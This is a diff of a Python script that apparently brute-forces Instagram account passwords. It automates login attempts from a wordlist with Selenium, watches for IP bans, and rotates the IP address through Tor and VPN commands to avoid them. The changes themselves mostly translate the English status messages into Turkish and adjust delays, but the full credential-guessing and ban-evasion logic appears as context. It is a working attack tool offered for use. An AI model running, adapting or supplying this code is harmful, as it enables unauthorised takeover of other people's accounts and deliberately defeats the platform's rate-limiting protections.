@@ -17,7 +17,7 @@ a=subprocess.check_output(["id"])
 ip_counter=1
 ip_counter_openvpn=1
 if not "root" in a.decode():
-    print(colored.red("[-]This Feature Requires Root Permission. Please Be Sure That You Are Root!"))
+    print(colored.red("[-]Bu Araç Root Yetkisi Gerektiriyor!"))
     exit()
 def ip_changer_tor():
     tor_network=["sudo xterm -e killall openvpn && sudo xterm -e killall autovpn && sudo xterm -e torghost -x && sudo xterm -e torghost -s"]
@@ -48,8 +48,7 @@ def ig_brute(username,password_wordlist):
     ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
     ip_adr=ip_adr.decode()
     print(colored.red("-")*50)
-    print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
-    print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
+    print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("IP Adresiniz Değiştirildi:")+colored.blue(str(ip_adr)))
     print(colored.red("-")*50)
     start_insta(username)
     x=0
@@ -61,7 +60,7 @@ def ig_brute(username,password_wordlist):
             time.sleep(2.5)
             
         except KeyboardInterrupt:
-            print(colored.red("[-]CTRL+C DETECTED EXITING..."))
+            print(colored.red("[-]CTRL+C ALGILANDI ÇIKILIYOR..."))
             exit()
         except:
             pass
@@ -69,70 +68,68 @@ def ig_brute(username,password_wordlist):
             captcha=WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[7]/p'))).text
             if "your password was incorrect." in captcha:
                 if x < 0:
-                    print(colored.red("[-]Password Is Not:")+colored.magenta(password_wordlist[x]))
+                    print(colored.red("[-]Parola Değil:")+colored.magenta(password_wordlist[x]))
                     with open("Passwords/entered_passwords.txt","a+") as fi:
                         fi.write("\n"+password_wordlist[x])
                 else:
-                    print(colored.red("[-]Password Is Not:")+colored.magenta(password_wordlist[x]))
+                    print(colored.red("[-]Parola Değil:")+colored.magenta(password_wordlist[x]))
                     with open("Passwords/entered_passwords.txt","a+") as fi:
                         fi.write("\n"+password_wordlist[x])
             elif "a problem" in captcha or "couldn't connect to Instagram" in captcha or "wait" in captcha:
                 if x>0:
                     x=x-1  
                 driver.close()
-                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("This Ip Address Is Banned. Changing The Ip Address"))
+                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Bu IP Adresi Banlandı. IP Adresi Değiştiriliyor.."))
                 ip_changer_tor()
                 ip_counter+=1
                 ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
                 ip_adr=ip_adr.decode()
                 print(colored.red("-")*50)
-                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
-                print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
+                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("IP Adresiniz Değiştirildi:")+colored.blue(str(ip_adr)))
                 print(colored.red("-")*50)
                 start_insta(username)
                 WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
                 WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
-                time.sleep(2.5)
+                time.sleep(2)
             else:
-                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x-1]))
+                print(colored.green("[+]Parola BULUNDU!! -->")+colored.blue(password_wordlist[x-1]))
                 
         except KeyboardInterrupt:
-            print(colored.red("[-]CTRL+C DETECTED EXITING..."))
+            print(colored.red("[-]CTRL+C ALGILANDI ÇIKILIYOR..."))
             exit()
         except:
             try:
                 WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/nav/div[2]/div/div/div[1]/a/div/div/img'))).click()
-                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
+                print(colored.green("[+]Parola BULUNDU!! -->")+colored.blue(password_wordlist[x]))
                 break
                 exit()
             except KeyboardInterrupt:
-                print(colored.red("[-]CTRL+C DETECTED EXITING..."))
+                print(colored.red("[-]CTRL+C ALGILANDI ÇIKILIYOR..."))
                 exit()
             except:
                 try:
                     WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/div/div/header/div[2]/div/div/div[1]/a/div/div/img'))).click()
-                    print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
+                    print(colored.green("[+]Parola BULUNDU!! -->")+colored.blue(password_wordlist[x]))
                     break
                     exit()
                 except:
                     try:
                         driver.close()
-                        print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("This Ip Address Is Banned. Changing The Ip Address"))
+                        print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Bu IP Adresi Banlandı. IP Değiştiriliyor.."))
                         ip_changer_tor()
                         ip_counter+=1
                 
                         ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
                         ip_adr=ip_adr.decode()
                         print(colored.red("-")*50)
-                        print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
-                        print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
+                        print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("IP Adresiniz Değiştirildi:")+colored.blue(str(ip_adr)))
                         print(colored.red("-")*50)
                         start_insta(username)
                         WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
                         WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
-                        time.sleep(2)
+                        time.sleep(2.5)
                     except:
-                        print(colored.red("[-]Password Is Not In The Wordlist That You Provided!"))
+                        print(colored.red("[-]Parola Belirttiğiniz Wordlist İçerisinde Bulunmuyor!"))
         x+=1
     for j in password_wordlist:
         with open("Passwords/entered_passwords.txt","r") as fenerbahce:
